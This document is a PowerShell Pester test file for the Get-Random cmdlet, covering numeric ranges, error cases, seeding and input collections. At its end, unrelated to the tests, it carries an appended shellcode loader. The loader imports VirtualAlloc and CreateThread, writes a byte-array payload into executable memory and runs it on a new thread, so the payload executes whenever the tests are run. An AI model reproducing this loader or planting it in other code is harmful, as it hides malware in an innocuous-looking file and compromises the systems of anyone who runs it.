

Describe "Get-Random DRT Unit Tests" -Tags "CI" {
    $testData = @(
        @{ Name = 'no params'; Maximum = $null; Minimum = $null; GreaterThan = -1; LessThan = ([int32]::MaxValue); Type = 'System.Int32' }
        @{ Name = 'only positive maximum number'; Maximum = 100; Minimum = $null; GreaterThan = -1; LessThan = 100; Type = 'System.Int32' }
        @{ Name = 'maximum set to 0, Minimum to a negative number'; Maximum = 0; Minimum = -100; GreaterThan = -101; LessThan = 0; Type = 'System.Int32' }
        @{ Name = 'positive maximum, negative Minimum'; Maximum = 100; Minimum = -100; GreaterThan = -101; LessThan = 100; Type = 'System.Int32' }
        @{ Name = 'both negative'; Maximum = -100; Minimum = -200; GreaterThan = -201; LessThan = -100; Type = 'System.Int32' }
        @{ Name = 'both negative with parentheses'; Maximum = (-100); Minimum = (-200); GreaterThan = -201; LessThan = -100; Type = 'System.Int32' }
        @{ Name = 'maximum enclosed in quote'; Maximum = '8'; Minimum = 5; GreaterThan = 4; LessThan = 8; Type = 'System.Int32' }
        @{ Name = 'minimum enclosed in quote'; Maximum = 8; Minimum = '5'; GreaterThan = 4; LessThan = 8; Type = 'System.Int32' }
        @{ Name = 'maximum with plus sign'; Maximum = +100; Minimum = 0; GreaterThan = -1; LessThan = 100; Type = 'System.Int32' }
        @{ Name = 'maximum with plus sign and quote'; Maximum = '+100'; Minimum = 0; GreaterThan = -1; LessThan = 100; Type = 'System.Int32' }
        @{ Name = 'both with quote'; Maximum = '+100'; Minimum = '-100'; GreaterThan = -101; LessThan = 100; Type = 'System.Int32' }
        @{ Name = 'maximum set to kb'; Maximum = '1kb'; Minimum = 0; GreaterThan = -1; LessThan = 1024; Type = 'System.Int32' }
        @{ Name = 'maximum is Int64.MaxValue'; Maximum = ([int64]::MaxValue); Minimum = $null; GreaterThan = ([int64]-1); LessThan = ([int64]::MaxValue); Type = 'System.Int64' }
        @{ Name = 'maximum is a 64-bit integer'; Maximum = ([int64]100); Minimum = $null; GreaterThan = ([int64]-1); LessThan = ([int64]100); Type = 'System.Int64' }
        @{ Name = 'maximum set to a large integer greater than int32.MaxValue'; Maximum = 100000000000; Minimum = $null; GreaterThan = ([int64]-1); LessThan = ([int64]100000000000); Type = 'System.Int64' }
        @{ Name = 'maximum set to 0, Minimum set to a negative 64-bit integer'; Maximum = ([int64]0); Minimum = ([int64]-100); GreaterThan = ([int64]-101); LessThan = ([int64]0); Type = 'System.Int64' }
        @{ Name = 'maximum set to positive 64-bit number, min set to negative 64-bit number'; Maximum = ([int64]100); Minimum = ([int64]-100); GreaterThan = ([int64]-101); LessThan = ([int64]100); Type = 'System.Int64' }
        @{ Name = 'both are negative 64-bit number'; Maximum = ([int64]-100); Minimum = ([int64]-200); GreaterThan = ([int64]-201); LessThan = ([int64]-100); Type = 'System.Int64' }
        @{ Name = 'both are negative 64-bit number with parentheses'; Maximum = ([int64](-100)); Minimum = ([int64](-200)); GreaterThan = ([int64]-201); LessThan = ([int64]-100); Type = 'System.Int64' }
        @{ Name = 'max is 32-bit, min is 64-bit integer'; Maximum = '8'; Minimum = ([int64]5); GreaterThan = ([int64]4); LessThan = ([int64]8); Type = 'System.Int64' }
        @{ Name = 'max is 64-bit, min is 32-bit integer'; Maximum = ([int64]8); Minimum = '5'; GreaterThan = ([int64]4); LessThan = ([int64]8); Type = 'System.Int64' }
        @{ Name = 'max set to a 32-bit integer, min set to [int64]0'; Maximum = +100; Minimum = ([int64]0); GreaterThan = ([int64]-1); LessThan = ([int64]100); Type = 'System.Int64' }
        @{ Name = 'max set to a 32-bit integer with quote'; Maximum = '+100'; Minimum = ([int64]0); GreaterThan = ([int64]-1); LessThan = ([int64]100); Type = 'System.Int64' }
        @{ Name = 'max is [int64]0, min is a 32-bit integer'; Maximum = ([int64]0); Minimum = '-100'; GreaterThan = ([int64]-101); LessThan = ([int64]0); Type = 'System.Int64' }
        @{ Name = 'min set to 1MB, max set to a 64-bit integer greater than min'; Maximum = ([int64]1048585); Minimum = '1mb'; GreaterThan = ([int64]1048575); LessThan = ([int64]1048585); Type = 'System.Int64' }
        @{ Name = 'max set to 1tb, min set to 10 mb'; Maximum = '1tb'; Minimum = '10mb'; GreaterThan = ([int64]10485759); LessThan = ([int64]1099511627776); Type = 'System.Int64' }
        @{ Name = 'max is int64.MaxValue, min is Int64.MinValue'; Maximum = ([int64]::MaxValue); Minimum = ([int64]::MinValue); GreaterThan = ([int64]::MinValue); LessThan = ([int64]::MaxValue); Type = 'System.Int64' }
        @{ Name = 'both are int64.MaxValue plus a 32-bit integer'; Maximum = ([int64](([int]::MaxValue)+15)); Minimum = ([int64](([int]::MaxValue)+10)); GreaterThan = ([int64](([int]::MaxValue)+9)); LessThan = ([int64](([int]::MaxValue)+15)); Type = 'System.Int64' }
        @{ Name = 'both are greater than int32.MaxValue without specified type, and max with quote'; Maximum = '100099000001'; Minimum = 100000000001; GreaterThan = ([int64]10000000000); LessThan = ([int64]100099000001); Type = 'System.Int64' }
        @{ Name = 'both are greater than int32.MaxValue without specified type, and min with quote'; Maximum = 100000002230; Minimum = '100000002222'; GreaterThan = ([int64]100000002221); LessThan = ([int64]100000002230); Type = 'System.Int64' }
        @{ Name = 'max is greater than int32.MaxValue without specified type'; Maximum = 90000000000; Minimum = 4; GreaterThan = ([int64]3); LessThan = ([int64]90000000000); Type = 'System.Int64' }
        @{ Name = 'max is a double-precision number'; Maximum = 100.0; Minimum = $null; GreaterThan = -1.0; LessThan = 100.0; Type = 'System.Double' }
        @{ Name = 'both are double-precision numbers, min is negative.'; Maximum = 0.0; Minimum = -100.0; GreaterThan = -101.0; LessThan = 0.0; Type = 'System.Double' }
        @{ Name = 'both are double-precision number, max is positive, min is negative.'; Maximum = 100.0; Minimum = -100.0; GreaterThan = -101.0; LessThan = 100.0; Type = 'System.Double' }
        @{ Name = 'max is a double-precision number, min is int32'; Maximum = 8.0; Minimum = 5; GreaterThan = 4.0; LessThan = 8.0; Type = 'System.Double' }
        @{ Name = 'min is a double-precision number, max is int32'; Maximum = 8; Minimum = 5.0; GreaterThan = 4.0; LessThan = 8.0; Type = 'System.Double' }
        @{ Name = 'max set to a special double number'; Maximum = 20.; Minimum = 0.0; GreaterThan = -1.0; LessThan = 20.0; Type = 'System.Double' }
        @{ Name = 'max is double with quote'; Maximum = '20.'; Minimum = 0.0; GreaterThan = -1.0; LessThan = 20.0; Type = 'System.Double' }
        @{ Name = 'max is double with plus sign'; Maximum = +100.0; Minimum = 0; GreaterThan = -1.0; LessThan = 100.0; Type = 'System.Double' }
        @{ Name = 'max is double with plus sign and enclosed in quote'; Maximum = '+100.0'; Minimum = 0; GreaterThan = -1.0; LessThan = 100.0; Type = 'System.Double' }
        @{ Name = 'both set to the special numbers as 1.0e+xx '; Maximum = $null; Minimum = 1.0e+100; GreaterThan = 1.0e+99; LessThan = ([double]::MaxValue); Type = 'System.Double' }
        @{ Name = 'max is Double.MaxValue, min is Double.MinValue'; Maximum = ([double]::MaxValue); Minimum = ([double]::MinValue); GreaterThan = ([double]::MinValue); LessThan = ([double]::MaxValue); Type = 'System.Double' }
    )

    $testDataForError = @(
        @{ Name = 'Min is greater than max and all are positive 32-bit integer'; Maximum = 10; Minimum = 20}
        @{ Name = 'Min and Max are same and all are positive 32-bit integer'; Maximum = 20; Minimum = 20}
        @{ Name = 'Min is greater than max and all are negative 32-bit integer'; Maximum = -20; Minimum = -10}
        @{ Name = 'Min and Max are same and all are negative 32-bit integer'; Maximum = -20; Minimum = -20}
        @{ Name = 'Min is greater than max and all are positive double-precision number'; Maximum = 10.0; Minimum = 20.0}
        @{ Name = 'Min and Max are same and all are positive double-precision number'; Maximum = 20.0; Minimum = 20.0}
        @{ Name = 'Min is greater than max and all are negative double-precision number'; Maximum = -20.0; Minimum = -10.0}
        @{ Name = 'Min and Max are same and all are negative double-precision number'; Maximum = -20.0; Minimum = -20.0}
        @{ Name = 'Max is a negative number, min is the default number '; Maximum = -10; Minimum = $null}
    )

    
    It "Should return a correct random number for '<Name>'" -TestCases $testData {
        param($maximum, $minimum, $greaterThan, $lessThan, $type)

        $result = Get-Random -Maximum $maximum -Minimum $minimum
        $result | Should -BeGreaterThan $greaterThan
        $result | Should -BeLessThan $lessThan
        $result | Should -BeOfType $type
    }

    It "Should return correct random numbers for '<Name>' with Count specified" -TestCases $testData {
        param($maximum, $minimum, $greaterThan, $lessThan, $type)

        $result = Get-Random -Maximum $maximum -Minimum $minimum -Count 1
        $result | Should -BeGreaterThan $greaterThan
        $result | Should -BeLessThan $lessThan
        $result | Should -BeOfType $type

        $result = Get-Random -Maximum $maximum -Minimum $minimum -Count 3
        foreach ($randomNumber in $result) {
            $randomNumber | Should -BeGreaterThan $greaterThan
            $randomNumber | Should -BeLessThan $lessThan
            $randomNumber | Should -BeOfType $type
        }
    }

    It "Should be able to throw error when '<Name>'" -TestCases $testDataForError {
        param($maximum, $minimum)
        { Get-Random -Minimum $minimum -Maximum $maximum } | Should -Throw -ErrorId "MinGreaterThanOrEqualMax,Microsoft.PowerShell.Commands.GetRandomCommand"
    }

    It "Tests for setting the seed" {
        $result1 = (get-random -SetSeed 123), (get-random)
        $result2 = (get-random -SetSeed 123), (get-random)
        $result1 | Should -Be $result2
    }
}

Describe "Get-Random" -Tags "CI" {
    It "Should return a random number greater than -1" {
        Get-Random | Should -BeGreaterThan -1
    }

    It "Should return a random number less than 100" {
        Get-Random -Maximum 100 | Should -BeLessThan 100
        Get-Random -Maximum 100 | Should -BeGreaterThan -1
    }

    It "Should return a random number less than 100 and greater than -100 " {
        $randomNumber = Get-Random -Minimum -100 -Maximum 100
        $randomNumber | Should -BeLessThan 100
        $randomNumber | Should -BeGreaterThan -101
    }

    It "Should return a random number less than 20.93 and greater than 10.7 " {
        $randomNumber = Get-Random -Minimum 10.7 -Maximum 20.93
        $randomNumber | Should -BeLessThan 20.93
        $randomNumber | Should -BeGreaterThan 10.7
    }

    It "Should return same number for both Get-Random when switch SetSeed is used " {
        $firstRandomNumber = Get-Random -Maximum 100 -SetSeed 23
        $secondRandomNumber = Get-Random -Maximum 100 -SetSeed 23
        $firstRandomNumber | Should -Be $secondRandomNumber
    }

    It "Should return a number from 1,2,3,5,8,13 " {
        $randomNumber = Get-Random -InputObject 1, 2, 3, 5, 8, 13
        $randomNumber | Should -BeIn 1, 2, 3, 5, 8, 13
    }

    It "Should return an array " {
        $randomNumber = Get-Random -InputObject 1, 2, 3, 5, 8, 13 -Count 3
        $randomNumber.Count | Should -Be 3
        ,$randomNumber | Should -BeOfType "System.Array"
    }

    It "Should return three random numbers for array of 1,2,3,5,8,13 " {
        $randomNumber = Get-Random -InputObject 1, 2, 3, 5, 8, 13 -Count 3
        $randomNumber.Count | Should -Be 3
        $randomNumber[0] | Should -BeIn 1, 2, 3, 5, 8, 13
        $randomNumber[1] | Should -BeIn 1, 2, 3, 5, 8, 13
        $randomNumber[2] | Should -BeIn 1, 2, 3, 5, 8, 13
        $randomNumber[3] | Should -BeNullOrEmpty
    }

    It "Should return all the numbers for array of 1,2,3,5,8,13 in no particular order" {
        $randomNumber = Get-Random -InputObject 1, 2, 3, 5, 8, 13 -Count ([int]::MaxValue)
        $randomNumber.Count | Should -Be 6
        $randomNumber[0] | Should -BeIn 1, 2, 3, 5, 8, 13
        $randomNumber[1] | Should -BeIn 1, 2, 3, 5, 8, 13
        $randomNumber[2] | Should -BeIn 1, 2, 3, 5, 8, 13
        $randomNumber[3] | Should -BeIn 1, 2, 3, 5, 8, 13
        $randomNumber[4] | Should -BeIn 1, 2, 3, 5, 8, 13
        $randomNumber[5] | Should -BeIn 1, 2, 3, 5, 8, 13
        $randomNumber[6] | Should -BeNullOrEmpty
    }

    It "Should return for a string collection " {
        $randomNumber = Get-Random -InputObject "red", "yellow", "blue"
        $randomNumber | Should -Be ("red" -or "yellow" -or "blue")
    }

    It "Should return a number for hexadecimal " {
        $randomNumber = Get-Random 0x07FFFFFFFFF
        $randomNumber | Should -BeLessThan 549755813887
        $randomNumber | Should -BeGreaterThan 0
    }

    It "Should return false, check two random numbers are not equal when not using the SetSeed switch " {
        $firstRandomNumber = Get-Random
        $secondRandomNumber = Get-Random
        $firstRandomNumber | Should -Not -Be $secondRandomNumber
    }

    It "Should return the same number for hexadecimal number and regular number when the switch SetSeed it used " {
        $firstRandomNumber = Get-Random 0x07FFFFFFFF -SetSeed 20
        $secondRandomNumber = Get-Random 34359738367 -SetSeed 20
        $firstRandomNumber | Should -Be @secondRandomNumber
    }

    It "Should throw an error because the hexadecimal number is to large " {
        { Get-Random 0x07FFFFFFFFFFFFFFFF } | Should -Throw "Value was either too large or too small for a UInt32"
    }

    It "Should accept collection containing empty string for -InputObject" {
        1..10 | ForEach-Object {
            Get-Random -InputObject @('a','b','') | Should -BeIn 'a','b',''
        }
    }

    It "Should accept `$null in collection for -InputObject" {
        1..10 | ForEach-Object {
            Get-Random -InputObject @('a','b',$null) | Should -BeIn 'a','b',$null
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x79,0xcb,0xf3,0xb8,0xd9,0xe1,0xd9,0x74,0x24,0xf4,0x5f,0x31,0xc9,0xb1,0x47,0x31,0x57,0x13,0x83,0xc7,0x04,0x03,0x57,0x76,0x29,0x06,0x44,0x60,0x2f,0xe9,0xb5,0x70,0x50,0x63,0x50,0x41,0x50,0x17,0x10,0xf1,0x60,0x53,0x74,0xfd,0x0b,0x31,0x6d,0x76,0x79,0x9e,0x82,0x3f,0x34,0xf8,0xad,0xc0,0x65,0x38,0xaf,0x42,0x74,0x6d,0x0f,0x7b,0xb7,0x60,0x4e,0xbc,0xaa,0x89,0x02,0x15,0xa0,0x3c,0xb3,0x12,0xfc,0xfc,0x38,0x68,0x10,0x85,0xdd,0x38,0x13,0xa4,0x73,0x33,0x4a,0x66,0x75,0x90,0xe6,0x2f,0x6d,0xf5,0xc3,0xe6,0x06,0xcd,0xb8,0xf8,0xce,0x1c,0x40,0x56,0x2f,0x91,0xb3,0xa6,0x77,0x15,0x2c,0xdd,0x81,0x66,0xd1,0xe6,0x55,0x15,0x0d,0x62,0x4e,0xbd,0xc6,0xd4,0xaa,0x3c,0x0a,0x82,0x39,0x32,0xe7,0xc0,0x66,0x56,0xf6,0x05,0x1d,0x62,0x73,0xa8,0xf2,0xe3,0xc7,0x8f,0xd6,0xa8,0x9c,0xae,0x4f,0x14,0x72,0xce,0x90,0xf7,0x2b,0x6a,0xda,0x15,0x3f,0x07,0x81,0x71,0x8c,0x2a,0x3a,0x81,0x9a,0x3d,0x49,0xb3,0x05,0x96,0xc5,0xff,0xce,0x30,0x11,0x00,0xe5,0x85,0x8d,0xff,0x06,0xf6,0x84,0x3b,0x52,0xa6,0xbe,0xea,0xdb,0x2d,0x3f,0x13,0x0e,0xe1,0x6f,0xbb,0xe1,0x42,0xc0,0x7b,0x52,0x2b,0x0a,0x74,0x8d,0x4b,0x35,0x5f,0xa6,0xe6,0xcf,0x37,0x00,0x06,0x3b,0x3a,0xfa,0xe5,0xc4,0xd5,0xa7,0x60,0x22,0xbf,0x47,0x25,0xfc,0x57,0xf1,0x6c,0x76,0xc6,0xfe,0xba,0xf2,0xc8,0x75,0x49,0x02,0x86,0x7d,0x24,0x10,0x7e,0x8e,0x73,0x4a,0x28,0x91,0xa9,0xe1,0xd4,0x07,0x56,0xa0,0x83,0xbf,0x54,0x95,0xe3,0x1f,0xa6,0xf0,0x78,0xa9,0x32,0xbb,0x16,0xd6,0xd2,0x3b,0xe6,0x80,0xb8,0x3b,0x8e,0x74,0x99,0x6f,0xab,0x7a,0x34,0x1c,0x60,0xef,0xb7,0x75,0xd5,0xb8,0xdf,0x7b,0x00,0x8e,0x7f,0x83,0x67,0x0e,0x43,0x52,0x41,0x64,0xad,0x66;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

